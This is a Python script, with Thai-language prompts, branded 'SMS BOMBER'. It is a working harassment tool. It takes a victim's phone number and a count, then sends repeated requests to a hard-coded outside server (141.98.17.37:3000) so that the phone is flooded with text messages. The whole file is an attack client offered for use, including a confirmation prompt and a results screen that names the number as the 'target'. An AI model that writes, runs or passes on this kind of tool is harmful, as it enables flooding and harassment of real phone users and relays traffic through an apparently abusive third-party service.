#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   💣 SMS BOMBER - Python Edition                                              ║
║   ยิง SMS ผ่าน API รองรับทุกระบบ                                               ║
║                                                                               ║
║   by DeV ต้น X9CODESHOP                                                       ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import json
import time
import urllib.request
import urllib.error
import platform
from urllib.parse import urlencode

# ─── Configuration ───────────────────────────────────────────────────────────
API_URL = os.environ.get("SMS_API_URL", "http://141.98.17.37:3000")
VERSION = "3.0"

# ─── Colors ───────────────────────────────────────────────────────────────────
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# ─── Terminal Utils ───────────────────────────────────────────────────────────
def clear():
    """Clear screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_center(text, color=Colors.END):
    """Print centered text"""
    width = 79
    padding = (width - len(text)) // 2
    print(f"{' '*padding}{color}{text}{Colors.END}{' '*padding}")

def print_line(char='═', color=Colors.MAGENTA):
    """Print horizontal line"""
    print(f"{color}{char*79}{Colors.END}")

def print_box(text, color=Colors.WHITE):
    """Print text in box"""
    padding = (77 - len(text)) // 2
    extra = (77 - len(text)) % 2
    print(f"{Colors.MAGENTA}║{Colors.END}{' '*padding}{color}{text}{Colors.END}{' '*padding}{' '*extra}{Colors.MAGENTA}║{Colors.END}")

def print_box_top():
    print(f"{Colors.MAGENTA}╔{'═'*77}╗{Colors.END}")

def print_box_bottom():
    print(f"{Colors.MAGENTA}╚{'═'*77}╝{Colors.END}")

# ─── Banner ───────────────────────────────────────────────────────────────────
def show_banner():
    """Show beautiful banner"""
    clear()
    banner = f"""
{Colors.MAGENTA}                              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                              {Colors.END}
{Colors.MAGENTA}                         ▄▄▄▄▀▀▀▀          ▀▀▀▀▄▄▄▄                         {Colors.END}
{Colors.MAGENTA}                     ▄▄▀▀                          ▀▀▄▄                     {Colors.END}
{Colors.MAGENTA}                  ▄█▀                                  ▀█▄                  {Colors.END}
{Colors.MAGENTA}                ▄█▀     {Colors.CYAN}███████╗███╗   ███╗███████╗{Colors.MAGENTA}     ▀█▄                {Colors.END}
{Colors.MAGENTA}              ▄█▀       {Colors.CYAN}██╔════╝████╗ ████║██╔════╝{Colors.MAGENTA}       ▀█▄              {Colors.END}
{Colors.MAGENTA}             ▄█         {Colors.CYAN}███████╗██╔████╔██║█████╗ {Colors.MAGENTA}         █▄             {Colors.END}
{Colors.MAGENTA}            ▄█          {Colors.CYAN}╚════██║██║╚██╔╝██║██╔══╝ {Colors.MAGENTA}          █▄            {Colors.END}
{Colors.MAGENTA}           ▐█           {Colors.CYAN}███████║██║ ╚═╝ ██║███████╗{Colors.MAGENTA}           █▌           {Colors.END}
{Colors.MAGENTA}           ▐█           {Colors.CYAN}╚══════╝╚═╝     ╚═╝╚══════╝{Colors.MAGENTA}           █▌           {Colors.END}
{Colors.MAGENTA}            █▄                                           ▄█            {Colors.END}
{Colors.MAGENTA}            ▀█▄                                         ▄█▀            {Colors.END}
{Colors.MAGENTA}              ▀█▄         {Colors.RED}██████╗  ██████╗ ███╗   ███╗{Colors.MAGENTA}         ▄█▀              {Colors.END}
{Colors.MAGENTA}               ▀█▄        {Colors.RED}██╔══██╗██╔═══██╗████╗ ████║{Colors.MAGENTA}        ▄█▀               {Colors.END}
{Colors.MAGENTA}                 ▀█▄      {Colors.RED}██████╔╝██║   ██║██╔████╔██║{Colors.MAGENTA}      ▄█▀                 {Colors.END}
{Colors.MAGENTA}                   ▀█▄    {Colors.RED}██╔══██╗██║   ██║██║╚██╔╝██║{Colors.MAGENTA}    ▄█▀                   {Colors.END}
{Colors.MAGENTA}                     ▀█▄  {Colors.RED}██████╔╝╚██████╔╝██║ ╚═╝ ██║{Colors.MAGENTA}  ▄█▀                     {Colors.END}
{Colors.MAGENTA}                       ▀█▄{Colors.RED}╚═════╝  ╚═════╝ ╚═╝     ╚═╝{Colors.MAGENTA}▄█▀                       {Colors.END}
{Colors.MAGENTA}                         ▀█▄                        ▄█▀                         {Colors.END}
{Colors.MAGENTA}                           ▀█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▀                           {Colors.END}
{Colors.MAGENTA}                              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀                              {Colors.END}

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════════{Colors.END}
              {Colors.BOLD}⚡ ระบบยิง SMS อัตโนมัติ ผ่าน API ⚡{Colors.END}
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════════{Colors.END}
"""
    print(banner)
    print_box_top()
    print_box("💣 SMS BOMBER - Python Edition 💣", Colors.YELLOW)
    print_box("")
    print_box(f"เวอร์ชั่น {VERSION} | by {Colors.CYAN}DeV ต้น X9CODESHOP{Colors.END}{Colors.GRAY}", Colors.GRAY)
    print_box_bottom()
    print()

# ─── API Functions ────────────────────────────────────────────────────────────
def check_api():
    """Check if API is available"""
    print(f"{Colors.CYAN}  🔌 กำลังเชื่อมต่อ API...{Colors.END}")
    
    try:
        req = urllib.request.Request(
            f"{API_URL}/health",
            headers={'User-Agent': 'SMSBomber/3.0'},
            method='GET'
        )
        
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                print(f"{Colors.GREEN}  ✓ เชื่อมต่อ API สำเร็จ{Colors.END}")
                return True
    except Exception as e:
        pass
    
    print(f"{Colors.RED}  ✗ ไม่สามารถเชื่อมต่อ API ได้{Colors.END}")
    print()
    print(f"{Colors.YELLOW}  💡 กรุณาตรวจสอบ:{Colors.END}")
    print(f"     - อินเทอร์เน็ตเชื่อมต่ออยู่หรือไม่")
    print(f"     - API กำลังทำงานอยู่หรือไม่")
    return False

def send_sms(phone, count):
    """Send SMS via API"""
    success_count = 0
    fail_count = 0
    
    print()
    print_line("=", Colors.MAGENTA)
    print(f"{Colors.MAGENTA}{Colors.BOLD}  🚀 เริ่มยิง SMS...{Colors.END}")
    print_line("=", Colors.MAGENTA)
    print()
    
    width = 40
    
    for i in range(1, count + 1):
        # Progress bar
        percent = (i * 100) // count
        filled = (i * width) // count
        bar = '█' * filled + '░' * (width - filled)
        
        print(f"\r  {Colors.CYAN}▶{Colors.END} [{Colors.GREEN}{bar}{Colors.END}] {Colors.BOLD}{percent:3d}%{Colors.END} | {Colors.GREEN}✓ {success_count}{Colors.END} | {Colors.RED}✗ {fail_count}{Colors.END}", end='', flush=True)
        
        # Send request
        try:
            data = json.dumps({"phone": phone, "count": 1}).encode('utf-8')
            req = urllib.request.Request(
                f"{API_URL}/send",
                data=data,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'SMSBomber/3.0'
                },
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=15) as response:
                response_data = response.read().decode('utf-8')
                if '"success":true' in response_data:
                    success_count += 1
                else:
                    fail_count += 1
        except Exception as e:
            fail_count += 1
        
        time.sleep(0.3)
    
    print()
    print()
    return success_count, fail_count

def show_results(phone, count, success, failed):
    """Show attack results"""
    print_line("=", Colors.MAGENTA)
    print(f"{Colors.MAGENTA}{Colors.BOLD}  📊 สรุปผลการดำเนินการ{Colors.END}")
    print_line("=", Colors.MAGENTA)
    print()
    
    print(f"  {Colors.WHITE}╔{'═'*58}╗{Colors.END}")
    print(f"  {Colors.WHITE}║{Colors.END}  📱 เป้าหมาย:     {Colors.WHITE}{Colors.BOLD}{phone:<33}{Colors.END}{Colors.WHITE}║{Colors.END}")
    print(f"  {Colors.WHITE}║{Colors.END}  📨 จำนวนทั้งหมด: {Colors.WHITE}{Colors.BOLD}{count:<3} ครั้ง{Colors.END}{' '*23}{Colors.WHITE}║{Colors.END}")
    print(f"  {Colors.WHITE}║{Colors.END}  {Colors.GREEN}✓ สำเร็จ:{Colors.END}        {Colors.GREEN}{success:<3} ครั้ง{Colors.END}{' '*25}{Colors.WHITE}║{Colors.END}")
    print(f"  {Colors.WHITE}║{Colors.END}  {Colors.RED}✗ ล้มเหลว:{Colors.END}       {Colors.RED}{failed:<3} ครั้ง{Colors.END}{' '*24}{Colors.WHITE}║{Colors.END}")
    print(f"  {Colors.WHITE}╚{'═'*58}╝{Colors.END}")
    print()
    
    if success == count:
        print(f"  {Colors.GREEN}🎉 ยิงสำเร็จทั้งหมด!{Colors.END}")
    elif success > 0:
        print(f"  {Colors.YELLOW}⚡ ยิงสำเร็จบางส่วน{Colors.END}")
    else:
        print(f"  {Colors.RED}💥 ยิงไม่สำเร็จเลย{Colors.END}")

# ─── Input Functions ──────────────────────────────────────────────────────────
def input_phone():
    """Get phone number from user"""
    print()
    print_line("─", Colors.CYAN)
    print(f"{Colors.WHITE}{Colors.BOLD}  📱 ขั้นตอนที่ 1: ระบุเป้าหมาย{Colors.END}")
    print_line("─", Colors.CYAN)
    print()
    print(f"  {Colors.GRAY}รูปแบบ: 0812345678 (ตัวเลข 10 หลัก ไม่ต้องมีขีด){Colors.END}")
    print()
    
    while True:
        phone = input(f"  {Colors.CYAN}➤ เบอร์โทรศัพท์: {Colors.WHITE}{Colors.BOLD}").strip()
        print(Colors.END, end='')
        
        if phone.isdigit() and len(phone) == 10:
            return phone
        
        print(f"  {Colors.RED}✗ เบอร์โทรไม่ถูกต้อง กรุณาใส่ตัวเลข 10 หลัก{Colors.END}")
        print()

def input_count():
    """Get count from user"""
    print()
    print_line("─", Colors.CYAN)
    print(f"{Colors.WHITE}{Colors.BOLD}  🔢 ขั้นตอนที่ 2: ระบุจำนวน{Colors.END}")
    print_line("─", Colors.CYAN)
    print()
    print(f"  {Colors.GRAY}แนะนำ: 10-100 ครั้ง (ค่าที่เหมาะสม){Colors.END}")
    print()
    
    while True:
        count_str = input(f"  {Colors.CYAN}➤ จำนวนครั้ง: {Colors.WHITE}{Colors.BOLD}").strip()
        print(Colors.END, end='')
        
        if count_str.isdigit():
            count = int(count_str)
            if 1 <= count <= 100:
                return count
        
        print(f"  {Colors.RED}✗ จำนวนไม่ถูกต้อง กรุณาใส่ตัวเลข 1-100{Colors.END}")
        print()

def confirm_attack(phone, count):
    """Confirm attack"""
    print()
    print_line("─", Colors.YELLOW)
    print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  ยืนยันการดำเนินการ{Colors.END}")
    print_line("─", Colors.YELLOW)
    print()
    
    print(f"  {Colors.WHITE}┌{'─'*43}┐{Colors.END}")
    print(f"  {Colors.WHITE}│{Colors.END}  📱 เป้าหมาย: {Colors.WHITE}{Colors.BOLD}{phone}{Colors.END}")
    print(f"  {Colors.WHITE}│{Colors.END}  🔢 จำนวน: {Colors.WHITE}{Colors.BOLD}{count}{Colors.END} ครั้ง")
    print(f"  {Colors.WHITE}│{Colors.END}  🌐 ผ่าน: {Colors.GRAY}API{Colors.END}")
    print(f"  {Colors.WHITE}└{'─'*43}┘{Colors.END}")
    print()
    
    confirm = input(f"  {Colors.YELLOW}➤ ยืนยันการยิง SMS? (y/n): {Colors.WHITE}{Colors.BOLD}").strip().lower()
    print(Colors.END, end='')
    
    if confirm != 'y':
        print()
        print(f"  {Colors.CYAN}ℹ ยกเลิกการดำเนินการ{Colors.END}")
        sys.exit(0)

# ─── Modes ────────────────────────────────────────────────────────────────────
def interactive_mode():
    """Interactive mode"""
    show_banner()
    
    if not check_api():
        sys.exit(1)
    
    phone = input_phone()
    count = input_count()
    confirm_attack(phone, count)
    
    success, failed = send_sms(phone, count)
    show_results(phone, count, success, failed)
    
    print()
    print(f"  {Colors.CYAN}🙏 ขอบคุณที่ใช้บริการ{Colors.END} {Colors.WHITE}{Colors.BOLD}SMS BOMBER{Colors.END}")
    print(f"  {Colors.GRAY}by DeV ต้น X9CODESHOP{Colors.END}")
    print()

def quick_mode(phone, count):
    """Quick mode with arguments"""
    # Validate
    if not phone.isdigit() or len(phone) != 10:
        print(f"{Colors.RED}✗ เบอร์โทรไม่ถูกต้อง! ต้องเป็นตัวเลข 10 หลัก{Colors.END}")
        sys.exit(1)
    
    try:
        count_num = int(count)
        if not 1 <= count_num <= 100:
            raise ValueError()
    except ValueError:
        print(f"{Colors.RED}✗ จำนวนไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-100{Colors.END}")
        sys.exit(1)
    
    show_banner()
    
    if not check_api():
        sys.exit(1)
    
    print(f"  {Colors.CYAN}📱 เป้าหมาย:{Colors.END} {Colors.WHITE}{Colors.BOLD}{phone}{Colors.END}")
    print(f"  {Colors.CYAN}🔢 จำนวน:{Colors.END} {Colors.WHITE}{Colors.BOLD}{count}{Colors.END} ครั้ง")
    print()
    
    success, failed = send_sms(phone, count_num)
    show_results(phone, count_num, success, failed)

def show_help():
    """Show help"""
    show_banner()
    print(f"{Colors.WHITE}{Colors.BOLD}  📖 วิธีใช้งาน:{Colors.END}")
    print()
    print(f"  {Colors.CYAN}• โหมด Interactive (แนะนำ):{Colors.END}")
    print(f"    {Colors.GRAY}python smsbomber.py{Colors.END}")
    print()
    print(f"  {Colors.CYAN}• โหมดเร็ว (ผ่าน Arguments):{Colors.END}")
    print(f"    {Colors.GRAY}python smsbomber.py <เบอร์> <จำนวน>{Colors.END}")
    print(f"    {Colors.GRAY}python smsbomber.py 0812345678 10{Colors.END}")
    print()
    print(f"  {Colors.CYAN}• เปลี่ยน API:{Colors.END}")
    print(f"    {Colors.GRAY}export SMS_API_URL=http://localhost:3000{Colors.END}")
    print(f"    {Colors.GRAY}python smsbomber.py{Colors.END}")
    print()

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    """Main function"""
    args = sys.argv[1:]
    
    if len(args) == 0:
        # Interactive mode
        interactive_mode()
    elif args[0] in ['help', '-h', '--help']:
        show_help()
    elif len(args) == 2:
        # Quick mode
        quick_mode(args[0], args[1])
    else:
        show_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print(f"\n{Colors.YELLOW}⚠ ยกเลิกการดำเนินการ{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print()
        print(f"{Colors.RED}✗ เกิดข้อผิดพลาด: {str(e)}{Colors.END}")
        sys.exit(1)
